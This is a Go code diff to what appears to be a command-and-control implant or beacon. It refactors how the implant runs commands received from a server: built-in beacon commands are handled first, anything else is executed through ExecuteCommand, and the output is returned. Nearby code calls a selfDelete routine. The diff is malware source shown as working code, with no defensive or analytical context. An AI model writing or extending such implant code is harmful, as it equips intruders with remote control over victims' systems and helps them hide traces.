@@ -190,8 +190,11 @@ func windowsQuoteArg(s string) string {
 	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
 }
 
-// ExecuteCommand runs the received command and returns the output.
+// ExecuteCommand runs a built-in beacon command first (never exec), then otherwise runs argv[0] with args.
 func ExecuteCommand(command string) (string, error) {
+	if out, err, handled := runBuiltinHTTPCommand(command); handled {
+		return out, err
+	}
 	// Split the command into name and args
 	parts := strings.Fields(command)
 	if len(parts) == 0 {
@@ -335,13 +338,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					selfDelete()
 				}
 
-				var output string
-				var err error
-				if out, e, ok := runBuiltinHTTPCommand(commandStr); ok {
-					output, err = out, e
-				} else {
-					output, err = ExecuteCommand(commandStr)
-				}
+				output, err := ExecuteCommand(commandStr)
 				if err != nil {
 					log.Printf("[-] Command execution failed: %s\n", err)
 					output = err.Error()
